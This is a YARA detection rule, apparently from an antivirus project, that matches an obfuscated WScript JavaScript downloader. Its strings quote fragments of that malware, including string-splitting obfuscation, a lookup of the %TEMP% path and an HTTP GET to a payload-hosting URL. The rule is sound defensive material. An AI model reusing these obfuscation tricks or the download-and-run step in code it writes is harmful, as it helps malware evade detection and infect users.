rule sig_20160428_59095eb101d416c8ccdc8e77ace73ad6 {
  meta:
    description = "datamaliciousorder - file 20160428_59095eb101d416c8ccdc8e77ace73ad6.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "950d4a51ddfb90ec90c9b82cd0010ff1875e51bfbdae1ec326cb5450e410e5c6"

  strings:
    $s1  = "function TjwXyhFxxUseLliIbsXah(RcjDixDqdFejHwoJphNjd){FwkRqvCcvNbgNfiAdtVix[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function SztTzhKssRopApoHiiVpq() {return FwkRqvCcvNbgNfiAdtVix[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function TjwXyhFxxUseLliIbsXah(RcjDixDqdFejHwoJphNjd){FwkRqvCcvNbgNfiAdtVix[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "function KidBnlOnmEceZypOlmZqi(FkpLibJnpHqaLbtSenJkw, GqzJojShxUovNmzVwnKcg){QguLmrQklWxvMvbWweWzv = QguLmrQklWxvMvbWweWzv * 1; " ascii
    $s5  = "var FwkRqvCcvNbgNfiAdtVix = function RrvRtgNgyZexAmbFtaFzd() {return HmoGxmSgtBieBdkPydUvm[TcsEtsWicKpeKdwRhzMya](\"WScript\"+\"" ascii
    $s6  = "return FkpLibJnpHqaLbtSenJkw - GqzJojShxUovNmzVwnKcg;};" fullword ascii
    $s7  = "var HmoGxmSgtBieBdkPydUvm = this[\"WScript\"];" fullword ascii
    $s8  = "var FwkRqvCcvNbgNfiAdtVix = function RrvRtgNgyZexAmbFtaFzd() {return HmoGxmSgtBieBdkPydUvm[TcsEtsWicKpeKdwRhzMya](\"WScript\"+\"" ascii
    $s9  = "function SztTzhKssRopApoHiiVpq() {return FwkRqvCcvNbgNfiAdtVix[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s10 = "function LkxOcgPzsXzjTutWxpWbt(){return PtlGmiBjmTmuHmdGolCrd + \"\";};" fullword ascii
    $s11 = "function KidBnlOnmEceZypOlmZqi(FkpLibJnpHqaLbtSenJkw, GqzJojShxUovNmzVwnKcg){QguLmrQklWxvMvbWweWzv = QguLmrQklWxvMvbWweWzv * 1; " ascii
    $s12 = "function WomYoiSzfNpqMmdGyuSoy() {return ((RoeRnmNkzLabCguCrvPhx == true) && (RoeRnmNkzLabCguCrvPhx == TiyMkyMcdKtpBjmKetNbe)) ?" ascii
    $s13 = "TtwMpuMzcAxsHrfUvzDgc[VmjQhiYttVhzGcwYusWbd](\"G\" + \"ET\", \"http://holy.webtm.ru/o4ksla\", false);" fullword ascii
    $s14 = "function WomYoiSzfNpqMmdGyuSoy() {return ((RoeRnmNkzLabCguCrvPhx == true) && (RoeRnmNkzLabCguCrvPhx == TiyMkyMcdKtpBjmKetNbe)) ?" ascii
    $s15 = "function NmbNsyCqfWfeGuxDdcRav(WidAqeEwuXwxVxqWfxCtl) {var BryHzbMdhTblFjkVysKcv = (1, 2, 3, 4, 5, WidAqeEwuXwxVxqWfxCtl); retur" ascii
    $s16 = "return KidBnlOnmEceZypOlmZqi(1 == 1 ? YftWxoAoxDreDurTvkJxr : 0, 1 == 1 ? OjnMseJydXewNvnYbyEtz : 0);" fullword ascii
    $s17 = "function OdgRjiRnbKffQvkAfwEki(){return TcsEtsWicKpeKdwRhzMya;};" fullword ascii
    $s18 = "}while (PdrCwaGhcLkfWspRfrZjx);" fullword ascii
    $s19 = "var BiiNkkTsdUqfPthHbcYxf = new this[\"D\"+\"ate\"]();" fullword ascii
    $s20 = "function MslTpyWlvXscYbkZicTcc()" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}